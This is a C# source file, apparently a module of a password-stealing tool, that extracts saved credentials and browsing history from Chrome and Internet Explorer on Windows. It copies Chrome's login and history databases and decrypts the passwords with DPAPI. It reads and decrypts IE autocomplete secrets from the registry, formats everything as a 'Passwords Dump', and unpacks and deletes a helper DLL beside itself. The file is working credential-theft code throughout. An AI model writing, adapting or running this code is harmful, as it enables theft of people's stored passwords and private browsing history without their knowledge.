using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using Microsoft.Win32;

using Finisar.SQLite;
using System.IO;
using System.ComponentModel;
using UrlHistoryLibrary;
using System.Reflection;
using System.Windows.Forms;
using System.Diagnostics;


namespace myPwdExtractor
{
    public static class extractPwds
    {
        public const uint PROV_RSA_FULL = 1;
        public const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        public const uint CRYPT_NEWKEYSET = 0x00000008;
        public enum ALG_ID
        {
            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ( 4 << 13 ) | 4
        }
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptCreateHash(IntPtr hProv, ALG_ID Algid, IntPtr hKey, uint dwFlags, out  IntPtr phHash);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptGetHashParam(IntPtr hProv, int dwParam, byte[] pbData, out uint dwDataLen, uint dwFlags);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptDeriveKey(IntPtr hProv, ALG_ID Algid, IntPtr hBaseData, uint dwFlags, ref IntPtr phKey);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptDestroyHash(IntPtr hHash);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, [MarshalAs( UnmanagedType.Bool )]bool Final, uint dwFlags, byte[] pbData, ref int pdwDataLen);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptDestroyKey(IntPtr hKey);
        [DllImport( "advapi32.dll" )]
        [return: MarshalAs( UnmanagedType.Bool )]
        public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        [DllImport( "kernel32", SetLastError = true )]
        static extern bool FreeLibrary(IntPtr hModule);

        const string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0";
        const uint NTE_BAD_KEYSET = 0x80090016;

        //////////////////////////////////////////
        // CHROME
        //////////////////////////////////////////
        public static string extractChromeUrls()
        {
            string ret = "";
            SQLiteConnection connect;
            SQLiteCommand command;
            SQLiteDataReader reader;

            extractDll( "sqlite3" );


            string db_way = Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData )
                + "/Google/Chrome/User Data/Default/History"; 

            string temppath = Path.GetTempPath();

            if( File.Exists( temppath + "t.tmp" ) )
                File.Delete( temppath + "t.tmp" );
            File.Copy( db_way, temppath + "t.tmp" );

            db_way = Path.GetTempPath() + "t.tmp";

            ret += "!!YELLOW!!Chrome URLs Dump:\n";
            ret += "======================\n";

            //db_way = "c:\\temp\\t.db";
            connect = new SQLiteConnection( "Data Source=" + db_way + ";New=False;Version=3;UTF16Encoding=False" );
            connect.Open();
            command = connect.CreateCommand();
            command.CommandText = "SELECT * FROM urls";
            reader = command.ExecuteReader();
            while( reader.Read() )
            {
                ret += reader.GetString( 1 ) + "\n";
                ret += reader.GetString( 2 ) + "\n";
                ret += "Visit Count:" + reader.GetString( 3 ) + "\n";
                ret += FromUnixTime( Convert.ToInt64( reader.GetString( 5 )) / 1000000).ToString() + "\n";
                ret += "------------------------------\n";
            }
            connect.Close();
            if( File.Exists( temppath + "t.tmp" ) )
                File.Delete( temppath + "t.tmp" );


            return ret;
        } // endfunc

        public static void UnloadModule(string moduleName)
        {
            string myPath = Application.StartupPath;
            if( File.Exists( myPath + "\\" + moduleName + ".dll" ) )
            {
                foreach( ProcessModule mod in Process.GetCurrentProcess().Modules )
                {
                    if( mod.ModuleName.ToLower() == (moduleName + ".dll").ToLower() )
                    {
                        FreeLibrary( mod.BaseAddress );
                        File.Delete( myPath + "\\" + moduleName + ".dll" );
                        break;
                    }
                }
            }
        }


        public static DateTime FromUnixTime(long unixTime)
        {
            var epoch = new DateTime( 1601, 1, 1, 0, 0, 0, DateTimeKind.Utc );
            return epoch.AddSeconds( unixTime );
        }
        
        
        public static string extractChrome()
        {
            SQLiteConnection connect;
            SQLiteCommand command;
            SQLiteDataReader reader;

            extractDll( "sqlite3" );

            string db_way = Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData )
                + "/Google/Chrome/User Data/Default/Login Data"; //путь к файлу базы данных

            string temppath = Path.GetTempPath();

            if( File.Exists( temppath + "t.tmp" ) )
                File.Delete( temppath + "t.tmp" );
            File.Copy( db_way, temppath + "t.tmp" );

            db_way = Path.GetTempPath() + "t.tmp";
            string ret = "";

            ret += "!!YELLOW!!Chrome Passwords Dump:\n";
            ret += "======================\n";

            connect = new SQLiteConnection( "Data Source=" + db_way + ";New=False;Version=3;UTF16Encoding=False" );
            connect.Open();
            command = connect.CreateCommand();
            command.CommandText = "SELECT * FROM logins";
            reader = command.ExecuteReader();
            while( reader.Read() )
            {
                string mystr = reader.GetString( 1 );
                ret += mystr + "\n";
                mystr = reader.GetString( 2 );
                ret += mystr + ":  ";
                mystr = reader.GetString( 3 );
                ret += mystr + "\n";
                mystr = reader.GetString( 4 );
                ret += mystr + ": ";
                mystr = reader.GetString( 5 );
                byte[] byteArray = ( byte[] )reader.GetValue( 5 );
                string decrypted = Decrypt( byteArray );
                ret += decrypted + "\n";
            }
            connect.Close();
            if( File.Exists( temppath + "t.tmp" ) )
                File.Delete( temppath + "t.tmp" );
            ret += " \n ";
            return ret;
        } // endfunc

        //*********************************************
        // CHROME
        public static string Decrypt(byte[] blob)
        {
            byte[] decryptedBytes = ProtectedData.Unprotect( blob, null, DataProtectionScope.CurrentUser );
            return Encoding.UTF8.GetString( decryptedBytes );
        }

        public static void extractDll(string name)
        {
            string myPath = Application.StartupPath;
            if( File.Exists( myPath + "\\" + name + ".dll"))
                return;
            Assembly assem = Assembly.GetExecutingAssembly();
            AssemblyName an = assem.GetName();
            String resourceName = an.Name + "." + new AssemblyName( name ).Name + ".dll";
            using( var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream( resourceName ) )
            {
                Byte[] assemblyData = new Byte[stream.Length];
                stream.Read( assemblyData, 0, assemblyData.Length );


                File.WriteAllBytes( myPath + "\\" + name + ".dll", assemblyData );
            }
        } // endfunc
        /*
             ___ _____   ____   _    ____ ______        _____  ____  ____  ____  
            |_ _| ____| |  _ \ / \  / ___/ ___\ \      / / _ \|  _ \|  _ \/ ___| 
             | ||  _|   | |_) / _ \ \___ \___ \\ \ /\ / / | | | |_) | | | \___ \ 
             | || |___  |  __/ ___ \ ___) |__) |\ V  V /| |_| |  _ <| |_| |___) |
            |___|_____| |_| /_/   \_\____/____/  \_/\_/  \___/|_| \_\____/|____/ 
                                                                     
         */

        static public string dumpIEpasswords()
        {
            InternetExplorerUrls ieUrls = new InternetExplorerUrls();
            ieUrls.GetHistory();
            string url, ret = "";
            List<string[]> dataList = new List<string[]>();
            ret += "\n!!YELLOW!!IE Passwords Dump\n";
            ret += "-------------------------------------------------------------------------------\n";
            for( int i = 0; i < ieUrls.URLs.Count; i++ )
            {
                url = ieUrls.URLs[i].Url;
                int f1 = url.IndexOf( '?' );
                if( f1 > 0 )
                    url = url.Substring( 0, f1 );
                DecryptIePassword( url, dataList );
                if( dataList.Count > 0 )
                {
                    ret += dataList[0][0] + "   " + dataList[0][1] + "   [" + dataList[0][2] + "]\n";
                    dataList.Clear();
                }
            }
            ret += "-------------------------------------------------------------------------------\n";
            ret += "!!YELLOW!!End Dump Pwds\n";
            return ret;
        }


        // login reader class from https://web.archive.org/web/20150102064610/http://www.codeproject.com/Articles/857320/Decrypt-Stored-Passwords-from-Firefox-Chrome-and-I
        public class LoginInfo
        {
            public string Url { get; set; }
            public string Password { get; set; }
            public string UserName { get; set; }
            public string Browser { get; set; }

            public LoginInfo(string url, string title, string browser)
            {
                Url = url;
                UserName = title;
                Browser = browser;
            }
        }
        //List<LoginInfo> logins = new List<LoginInfo>();
        //
        // IE Autocomplete Secret Data structures decoded by Nagareshwar
        //

        //Main Decrypted Autocomplete Header data
        public struct IEAutoComplteSecretHeader
        {
            public Int32 dwSize;           //This header size
            public Int32 dwSecretInfoSize; //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
            public Int32 dwSecretSize;     //Size of the actual secret strings such as username & password
            public IESecretInfoHeader IESecretHeader;  //info about secrets such as count, size etc
            //SecretEntry secEntries[numSecrets]; //Header for each Secret String
            //WCHAR secrets[numSecrets];          //Actual Secret String in Unicode
        };


        public enum HashParameters
        {
            HP_ALGID = 1,
            HP_HASHVAL = 2,
            HP_HASHSIZE = 4,
            HP_HMAC_INFO = 5
        };

        //One Secret Info header specifying number of secret strings
        public struct IESecretInfoHeader
        {
            public Int32 dwIdHeader;     // value - 57 49 43 4B
            public Int32 dwSize;         // size of this header....24 bytes
            public Int32 dwTotalSecrets; // divide this by 2 to get actual website entries
            public Int32 unknown;
            public Int32 id4;            // value - 01 00 00 00
            public Int32 unknownZero;
        };


        // Header describing each of the secrets such ass username/password.
        // Two secret entries having same SecretId are paired
        struct SecretEntry
        {
            public Int32 dwOffset;    //Offset of this secret entry from the start of secret entry strings
            public char SecretId1, SecretId2, SecretId3, SecretId4, SecretId5, SecretId6, SecretId7, SecretId8; //UNIQUE id associated with the secret
            public Int32 dwLength;    //length of this secret
        };


        public static class LoginReader
        {
        }

        // read IE URLS
        public class InternetExplorerUrls
        {
            public InternetExplorerUrls()
            {
                URLs = new List<LoginInfo>();
            }
            // List of URL objects
            public List<LoginInfo> URLs { get; set; }
            public IEnumerable<LoginInfo> GetHistory()
            {
                // Initiate main object
                UrlHistoryWrapperClass urlhistory = new UrlHistoryWrapperClass();

                // Enumerate URLs in History
                UrlHistoryWrapperClass.STATURLEnumerator enumerator =
                                                   urlhistory.GetEnumerator();

                // Iterate through the enumeration
                while( enumerator.MoveNext() )
                {
                    // Obtain URL and Title
                    string url = enumerator.Current.URL.Replace( '\'', ' ' );
                    // In the title, eliminate single quotes to avoid confusion
                    string title = !string.IsNullOrEmpty( enumerator.Current.Title )
                              ? enumerator.Current.Title.Replace( '\'', ' ' ) : "";

                    // Create new entry
                    LoginInfo U = new LoginInfo( url, title, "Internet Explorer" );

                    // Add entry to list
                    URLs.Add( U );
                }

                // Optional
                enumerator.Reset();

                // Clear URL History
                //urlhistory.ClearHistory();

                return URLs;
            }
        } // endclass InternetExplorerUrls


        public static bool DoesURLMatchWithHash(string hashStr)
        {
            string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\\";
            //Now retrieve the encrypted credentials for this registry hash entry....
            RegistryKey key = Registry.CurrentUser.OpenSubKey( KeyStr /*+ hashStr*/ );
            if( key == null )
                return false;
            else
            {
                if( key.GetValue( hashStr ) != null )
                {
                    key.Close();
                    return true;
                }
                return false;
            }
        }




        public static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\\";
            //Get the hash for the passed URL
            string urlHash = GetURLHashString( url );

            //Check if this hash matches with stored hash in registry
            if( !DoesURLMatchWithHash( urlHash ) )
                return false;

            //Now retrieve the encrypted credentials for this registry hash entry....
            RegistryKey key = Registry.CurrentUser.OpenSubKey( KeyStr /*+ urlHash*/);
            if( key == null )
                return false;

            //Retrieve encrypted data for this website hash...
            //First get the value...
            byte[] cypherBytes = ( byte[] )key.GetValue( urlHash );
            key.Close();

            // to use URL as optional entropy we must include trailing null character
            byte[] optionalEntropy = new byte[2 * ( url.Length + 1 )];
            Buffer.BlockCopy( url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2 );

            //Now decrypt the Autocomplete credentials....
            byte[] decryptedBytes = ProtectedData.Unprotect
            ( cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser );

            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>( decryptedBytes );

            //check if the data contains enough length....
            if( decryptedBytes.Length >=
            ( ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize ) )
            {
                //Get the total number of secret entries (username & password) for the site...
                // user name and passwords are accounted as separate secrets
                //but will be treated in pairs here.
                uint dwTotalSecrets = ( uint )ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;

                int sizeOfSecretEntry = 16; //??????                Marshal.SizeOf( typeof( SecretEntry ) );
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = ( int )( ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize );
                Buffer.BlockCopy( decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length );

                if( dataList == null )
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = ( int )ieAutoHeader.dwSize + ieAutoHeader.IESecretHeader.dwSize;
                // Each time process 2 secret entries for username & password
                for( int i = 0; i < dwTotalSecrets; i++ )
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy( decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length );

                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>( secEntryBuffer );

                    // store data such as url, username & password for each secret

                    string[] dataTriplet = new string[3];

                    byte[] secret1 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy( secretsBuffer, ( int )secEntry.dwOffset, secret1, 0, secret1.Length );

                    dataTriplet[0] = Encoding.Unicode.GetString( secret1 );

                    // read another secret entry
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy( decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length );
                    secEntry = ByteArrayToStructure<SecretEntry>( secEntryBuffer );

                    //Get the next secret's offset i.e password
                    byte[] secret2 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy( secretsBuffer, ( int )secEntry.dwOffset, secret2, 0, secret2.Length );

                    dataTriplet[1] = Encoding.Unicode.GetString( secret2 );

                    dataTriplet[2] = urlHash;
                    //move to next entry
                    dataList.Add( dataTriplet );
                }
            }
            return true;
        } //End of function


        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc( bytes, GCHandleType.Pinned );
            T stuff = ( T )Marshal.PtrToStructure( handle.AddrOfPinnedObject(), typeof( T ) );
            handle.Free();
            return stuff;
        }

        static string GetURLHashString(string wstrURL)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;

            CryptAcquireContext
            ( out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT );

            if( !CryptCreateHash( hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, out hHash ) )
                throw new Win32Exception( Marshal.GetLastWin32Error() );

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes( wstrURL );

            StringBuilder urlHash = new StringBuilder( 42 );
            if( CryptHashData( hHash, bytesToCrypt, ( wstrURL.Length + 1 ) * 2, 0 ) )
            {
                // retrieve 20 bytes of hash value
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];

                //Get the hash value now...
                if( !CryptGetHashParam( hHash, ( int )HashParameters.HP_HASHVAL, buffer, out dwHashLen, 0 ) )
                    throw new Win32Exception( Marshal.GetLastWin32Error() );

                //Convert the 20 byte hash value to hexadecimal string format...
                byte tail = 0; // used to calculate value for the last 2 bytes
                urlHash.Length = 0;
                for( int i = 0; i < dwHashLen; ++i )
                {
                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat( "{0:X2}", c );
                }
                urlHash.AppendFormat( "{0:X2}", tail );

                CryptDestroyHash( hHash );
            }
            CryptReleaseContext( hProv, 0 );

            return urlHash.ToString();
        }




    } //end class
} // endnamespace
